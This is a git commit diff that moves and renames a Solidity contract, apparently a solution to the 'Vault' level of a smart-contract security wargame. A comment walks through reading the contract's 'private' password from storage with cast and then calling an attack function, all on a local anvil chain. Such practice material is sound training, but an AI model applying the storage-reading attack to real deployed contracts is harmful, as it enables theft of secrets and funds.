7c3827f723c2c3309d5c2bfe9c680df40cc7a0ed
grc02 <georgi.chonkov27@gmail.com>
2023-02-14 14:19:54 +0200

    Relocated the 'HackVault' contract in the 'levels/Vault' dir into the 'test' dir

--- test/Vault.t.sol
+++ test/Vault.t.sol
@@ -1,9 +1,9 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "./Vault.sol";
+import "../src/levels/Vault/Vault.sol";
 
-contract HackVault {
+contract VaultTest {
     function attack(address vaultAddress, bytes32 password) public {
         Vault vault = Vault(vaultAddress);
 
@@ -15,13 +15,13 @@ contract HackVault {
 
 // Steps to hacking the vault contract using cast and anvil:
 // 1. Export your env variables
-// 2. Spin up anvil by running in the CLI:
-// $ anvil
+// 2. Spin up anvil by running the following command in the CLI:
+//    $ anvil
 // 3. Deploy the vault contract by running the following command:
-// $ forge create --private-key $<PRIVATE_KEY> src/<PATH_TO_THE_FILE>:<CONTRACT_NAME> --constrctor-args <PASSWORD_OF_YOUR_CHOICE>
+//    $ forge create --private-key $<PRIVATE_KEY> src/<PATH_TO_THE_FILE>:<CONTRACT_NAME> --constrctor-args <PASSWORD_OF_YOUR_CHOICE>
 // 4. Read the private variable from the Vault contract:
-// $ cast storage <CONTRACT_ADDRESS> <STORAGE_SLOT>
+//    $ cast storage <CONTRACT_ADDRESS> <STORAGE_SLOT>
 // 5. Deploy the hack contract by running the following command:
-// $ forge create --private-key $<PRIVATE_KEY> src/<PATH_TO_THE_FILE>:<CONTRACT_NAME>
+//    $ forge create --private-key $<PRIVATE_KEY> test/<PATH_TO_THE_FILE>:<CONTRACT_NAME>
 // 6. Execute the attack function in the HackVault contract:
-// $ cast send --private-key <YOUR_PRIVATE_KEY> <TARGET_CONTRACT> <FUNC_SELECTOR> <ARGS_PASSED_TO_THE_CONSTRUCTOR>
+//    $ cast send --private-key <YOUR_PRIVATE_KEY> <TARGET_CONTRACT> <FUNC_SELECTOR> <ARGS_PASSED_TO_THE_CONSTRUCTOR>
